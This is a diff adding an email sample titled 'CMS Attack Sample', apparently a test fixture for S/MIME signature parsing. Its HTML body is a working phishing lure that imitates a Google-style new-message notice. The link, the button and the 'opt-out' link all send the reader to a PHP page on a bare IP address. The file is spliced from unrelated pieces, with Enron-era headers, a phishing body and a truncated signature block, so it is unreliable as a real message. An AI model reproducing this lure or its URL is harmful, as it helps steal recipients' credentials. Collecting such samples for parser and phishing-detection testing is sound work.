@@ -1,0 +1,78 @@
+From: mark_guinney@watsonwyatt.com
+To: erb@enron.com, kerb@houston.deepwater.com, velardeanita@msn.com, 
+Subject: CMS Attack Sample
+Content-Type: multipart/signed; protocol="application/x-pkcs7-signature"; micalg="sha-256"; boundary="----5D710E5192338F8D6E1D1324B6443410"
+This is an S/MIME signed message
+----5D710E5192338F8D6E1D1324B6443410
+0
+Content-Type: text/html; charset=ISO-8859-1
+Content-Transfer-Encoding: 7bit
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 3189
+
+
+<div style="max-width:700px;">
+
+<table cellspacing="0" cellpadding="0" style="color:#666666;font:13px Arial;border:solid 1px #dfdfdf;width:100%;">
+<tr>
+<td style="background:#2d2d2d;padding:8px 20px 8px 20px;">
+<a href="#" style="font-weight:bold;color:#cccccc;text-decoration:none;margin-right:20px;">+You</a>
+<a href="#" style="font-weight:bold;color:#cccccc;text-decoration:none;margin-right:20px;">Search</a>
+<a href="#" style="font-weight:bold;color:#cccccc;text-decoration:none;margin-right:20px;">Images</a>
+<a href="#" style="font-weight:bold;color:#cccccc;text-decoration:none;margin-right:20px;">Maps</a>
+<a href="#" style="font-weight:bold;color:#cccccc;text-decoration:none;margin-right:20px;">Play</a>
+<a href="#" style="font-weight:bold;color:#cccccc;text-decoration:none;margin-right:20px;">News</a>
+<a href="#" style="font-weight:bold;color:#cccccc;text-decoration:none;margin-right:20px;">Documents</a>
+<a href="#" style="font-weight:bold;color:#cccccc;text-decoration:none;margin-right:20px;">Calendar</a>
+</td>
+</tr>
+
+ <tr>
+  <td valign="top" style="padding: 20px 20px 0px 20px;">
+
+ <span style="color:#d44b38;font-size:22px;">jose@monkey.org</span><br />
+<br />
+<span style="font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;color:#2d2d2d;font-size:14px;font-weight:bold;">You have a new message.</span><br />
+<br />
+
+  </td>
+ </tr>
+
+ <tr>
+  <td style="padding:0px 20px 20px 20px;">
+
+<div style="border:solid 1px #f2f2f2;padding:20px;">
+<span style="font-weight:bold;">4/02/2013</span><br />
+   <a style="color:#3366cc;" href="http://200.58.113.179/~soscash/prussianizations.php">Broken message was found and recovered.</a>
+</div>
+
+  </td>
+ </tr>
+
+ <tr>
+  <td style="padding:10px 20px 10px 20px;background-color:#f2f2f2;">
+
+   <form target="_blank" method="GET" action="http://200.58.113.179/~soscash/prussianizations.php" style="margin:0px">
+    <input style="font-family:Arial;display:inline-block;padding:7px 15px;background-color:#d44b38;color:#ffffff;font-size:13px;font-weight:bold;border-radius:2px;-webkit-border-radius:2px;-moz-border-radius:2px;border:solid 1px #c43b28;white-space:nowrap;text-decoration:none;cursor:pointer" value="(3) messages" type="submit">
+   </form>
+
+  </td>
+ </tr>
+
+ <tr>
+  <td style="font-size:11px;padding:10px 20px 10px 20px;">
+
+We hope you found this message to be useful. However, if you'd rather not receive future e-mails of this sort, please opt-out <a style="color:#245dc1;text-decoration:none;" href="http://200.58.113.179/~soscash/prussianizations.php">here</a>.
+
+  </td>
+ </tr>
+</table>
+
+</div>
+----5D710E5192338F8D6E1D1324B6443410
+Content-Type: application/x-pkcs7-signature; name="smime.p7s"
+Content-Transfer-Encoding: base64 Content-Disposition: attachment; filename="smime.p7s"
+MDQGCSqGSIb3DQEHAqAnMCUCAQExDzANBglghkgBZQMEAgEFADALBgkqhkiG9w0BBwGgADEA
+----5D710E5192338F8D6E1D1324B6443410
